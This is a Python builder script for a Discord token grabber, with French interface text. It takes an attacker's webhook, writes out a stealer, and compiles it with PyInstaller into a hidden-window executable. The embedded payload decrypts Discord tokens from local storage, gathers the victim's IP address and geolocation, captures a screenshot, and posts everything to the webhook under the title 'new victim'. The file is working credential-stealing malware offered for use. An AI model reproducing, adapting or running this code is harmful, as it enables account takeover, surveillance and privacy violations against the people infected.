import sys
import subprocess
import shutil
import ctypes
import random as _rng
import time
import os
import requests
from colorama import init

init(autoreset=True)

_RST = "\033[0m"

def _c(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def gradient(start_color, end_color, steps):
    gradient_colors = []
    if steps < 2:
        gradient_colors.append(start_color)
        return gradient_colors
    for i in range(steps):
        t = i / (steps - 1)
        r = int(start_color[0] + (end_color[0] - start_color[0]) * t)
        g = int(start_color[1] + (end_color[1] - start_color[1]) * t)
        b = int(start_color[2] + (end_color[2] - start_color[2]) * t)
        gradient_colors.append((r, g, b))
    return gradient_colors

def multi_gradient(color_stops, steps):
    if steps <= 1:
        return [color_stops[0]]
    n = len(color_stops) - 1
    per_seg = max(steps // n, 1)
    colors = []
    for i in range(n):
        seg_steps = per_seg if i < n - 1 else (steps - len(colors))
        seg = gradient(color_stops[i], color_stops[i + 1], max(seg_steps, 2))
        if i > 0:
            seg = seg[1:]
        colors.extend(seg)
    while len(colors) < steps:
        colors.append(color_stops[-1])
    return colors[:steps]

def blue_sep(width=70):
    colors = multi_gradient([(0,0,30),(0,20,80),(0,60,160),(0,120,255),(100,180,255),(0,120,255),(0,60,160),(0,20,80),(0,0,30)], width)
    chars = "━"
    for i in range(width):
        r,g,b = colors[i]
        sys.stdout.write(f"{_c(r,g,b)}{chars}")
        sys.stdout.flush()
        if i % 4 == 0:
            time.sleep(0.005)
    sys.stdout.write(f"{_RST}\n\n")

def print_gradient_ascii(ascii_art):
    text = ascii_art.splitlines()
    if not text:
        return
    max_len = max(len(line) for line in text)
    total_lines = len(text)
    blue_stops = [
        (0, 0, 30),
        (0, 30, 100),
        (0, 80, 200),
        (0, 140, 255),
        (100, 200, 255),
        (255, 255, 255),
        (100, 200, 255),
        (0, 140, 255),
        (0, 80, 200),
        (0, 30, 100),
        (0, 0, 30),
    ]
    for row, line in enumerate(text):
        shift = row / max(total_lines - 1, 1)
        row_stops = []
        for s in blue_stops:
            intensity = max(0, 1.0 - abs(shift - 0.5) * 2.2)
            flicker = 1.0 + (_rng.random() - 0.5) * 0.15
            r = int(min(s[0] * (1 + intensity * 0.8) * flicker, 255))
            g = int(min(s[1] * (1 + intensity * 1.2) * flicker, 255))
            b = int(min(s[2] * (1 + intensity * 1.5) * flicker, 255))
            row_stops.append((min(r,255), min(g,255), min(b,255)))
        colors = multi_gradient(row_stops, max(max_len, 2))
        offset = int(shift * max_len * 0.25)
        padded = line.ljust(max_len)
        for i, char in enumerate(padded):
            ci = (i + offset) % len(colors)
            r,g,b = colors[ci]
            sys.stdout.write(f"\033[38;2;{r};{g};{b}m{char}")
        sys.stdout.write(f"{_RST}\n")
        sys.stdout.flush()
        time.sleep(0.015)

def input_blue(prompt):
    sys.stdout.write(f"{_c(0,120,255)}{prompt}{_RST}")
    sys.stdout.flush()
    return input()

_BANNER = r"""
  ▄████  ██▀███   ▄▄▄       ▄▄▄▄    ▄▄▄▄    ▄▄▄▄   ▓█████  ██▀███  
 ██▒ ▀█▒▓██ ▒ ██▒▒████▄    ▓█████▄ ▓█████▄ ▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄  ▒██▒ ▄██▒██▒ ▄██▒██▒ ▄██▒███   ▓██ ░▄█ ▒
░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██ ▒██░█▀  ▒██░█▀  ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒░▓█  ▀█▓░▓█  ▀█▓░▓█  ▀█▓░▒████▒░██▓ ▒██▒
 ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░▒▓███▀▒░▒▓███▀▒░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
  ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░▒░▒   ░ ▒░▒   ░ ▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
░ ░   ░   ░░   ░   ░   ▒    ░    ░  ░    ░  ░    ░    ░     ░░   ░ 
      ░    ░           ░  ░ ░       ░       ░         ░  ░   ░     """ 

def reset_file_attributes(p):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(p,0x80)
    except:
        pass

def safe_remove(p):
    try:
        reset_file_attributes(p)
        if os.path.isfile(p):
            os.remove(p)
        elif os.path.isdir(p):
            for root,dirs,files in os.walk(p):
                for f in files:
                    reset_file_attributes(os.path.join(root,f))
            shutil.rmtree(p,ignore_errors=True)
    except:
        pass

def clear_screen():
    if os.name == 'posix':
        os.system('clear')
    else:
        os.system('cls')

def main():
    clear_screen()
    print_gradient_ascii(_BANNER)
    blue_sep()
    w = input_blue('Webhook : ').strip()
    if not w.startswith('https://discord.com/api/webhooks/'):
        print(input_blue('Webhook invalide - Appuie sur Entrée pour quitter...'))
        sys.exit()
    n = input_blue('Nom exe : ').strip() or 'grabber'
    
    # Code amélioré avec IP, géoloc et screenshot
    c = '''import os
import json
import base64
import re
import win32crypt
from Crypto.Cipher import AES
import requests
import ctypes
import sys
import socket
from PIL import ImageGrab
import time
import threading

WEBHOOK_URL = "{webhook_url}"

if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def get_encryption_key():
    try:
        p = os.path.expandvars(r"%APPDATA%\\\\discord\\\\Local State")
        with open(p, "r", encoding="utf-8") as f:
            j = json.load(f)
        k = win32crypt.CryptUnprotectData(base64.b64decode(j["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
        return k
    except:
        return None

def decrypt_payload(c, k):
    try:
        n = c[3:15]
        ci = AES.new(k, AES.MODE_GCM, nonce=n)
        return ci.decrypt_and_verify(c[15:-16], c[-16:]).decode()
    except:
        return ""

def find_tokens(p, k):
    t = []
    r = re.compile(b"dQw4w9WgXcQ:[^\\\\\\"]*")
    for f in os.listdir(p):
        if not(f.endswith(".log") or f.endswith(".ldb")):
            continue
        try:
            with open(os.path.join(p, f), "rb") as bf:
                d = bf.read()
            for m in r.findall(d):
                try:
                    dt = decrypt_payload(base64.b64decode(m[len(b"dQw4w9WgXcQ:"):]), k)
                    if dt and len(dt.split('.')) == 3:
                        t.append(dt)
                except:
                    continue
        except:
            continue
    return t

def get_ip_and_geo():
    try:
        r = requests.get('https://ipapi.co/json/', timeout=8)
        data = r.json()
        ip = data.get('ip', 'Unknown')
        geo = f"{data.get('city', '')}, {data.get('region', '')}, {data.get('country_name', '')} - {data.get('latitude', '')}, {data.get('longitude', '')}"
        return ip, geo
    except:
        try:
            ip = requests.get('https://api.ipify.org', timeout=5).text
            r2 = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            data2 = r2.json()
            geo = f"{data2.get('city', '')}, {data2.get('regionName', '')}, {data2.get('country', '')}"
            return ip, geo
        except:
            return socket.gethostbyname(socket.gethostname()), "Géolocalisation indisponible"

def take_screenshot():
    try:
        from PIL import ImageGrab
        import os
        path = os.path.join(os.environ['TEMP'], 'scr_capt.png')
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot.save(path)
        return path
    except:
        return None

def send_to_webhook(tokens, ip, geo, screenshot_path):
    if not tokens and not ip and not geo:
        return
    embed = {
        "embeds": [{
            "title": "🎯 NOUVELLE VICTIME",
            "color": 0x5865F2,
            "fields": [
                {"name": "🌐 IP Publique", "value": f"`{ip}`", "inline": True},
                {"name": "📍 Géolocalisation", "value": f"`{geo}`", "inline": True},
                {"name": "🎟️ Tokens Discord", "value": f"```{chr(10).join(tokens[:5])}```" if tokens else "Aucun token trouvé", "inline": False}
            ],
            "footer": {"text": "OpenMind Grabber v2.0"}
        }]
    }
    try:
        if screenshot_path and os.path.exists(screenshot_path):
            with open(screenshot_path, 'rb') as f:
                files = {'file': f}
                requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(embed)}, files=files)
            os.remove(screenshot_path)
        else:
            requests.post(WEBHOOK_URL, json=embed)
    except:
        pass

if __name__ == "__main__":
    time.sleep(1)
    ip, geo = get_ip_and_geo()
    screenshot = take_screenshot()
    p = os.path.expandvars(r"%APPDATA%\\\\discord\\\\Local Storage\\\\leveldb")
    tokens = []
    if os.path.exists(p):
        k = get_encryption_key()
        if k:
            tokens = list(set(find_tokens(p, k)))
    send_to_webhook(tokens[:10], ip, geo, screenshot)'''
    
    base = os.path.dirname(os.path.abspath(__file__))
    outdir = os.path.join(base, 'output')
    os.makedirs(outdir, exist_ok=True)
    t = os.path.join(outdir, 'grabber_temp.py')
    e = os.path.join(outdir, f'{n}.exe')
    safe_remove(t)
    
    with open(t, 'w', encoding='utf-8') as f:
        f.write(c.replace('{webhook_url}', w))
    
    if subprocess.run(['pyinstaller', '--version'], capture_output=True).returncode != 0:
        print(input_blue('PyInstaller non trouvé - Appuie sur Entrée...'))
        sys.exit()
    
    # Ajout des modules PIL et requests
    subprocess.run(['pyinstaller', '--onefile', '--windowed', 
                    '--hidden-import', 'Crypto', '--hidden-import', 'Crypto.Cipher',
                    '--hidden-import', 'win32crypt', '--hidden-import', 'PIL',
                    '--hidden-import', 'PIL.ImageGrab', '--hidden-import', 'requests',
                    '--noconfirm', '--clean', t], capture_output=True, text=True)
    
    safe_remove(e)
    shutil.move('dist/grabber_temp.exe', e)
    
    for p in [t, 'grabber_temp.spec', 'build', 'dist', '__pycache__']:
        safe_remove(p)
    
    blue_sep()
    print(f"{_c(0,200,0)}✓ Grabber généré : {e}{_RST}")
    print(f"{_c(0,200,0)}✓ IP + Géoloc + Screenshot + Tokens inclus{_RST}")
    time.sleep(3)

if __name__ == "__main__":
    main()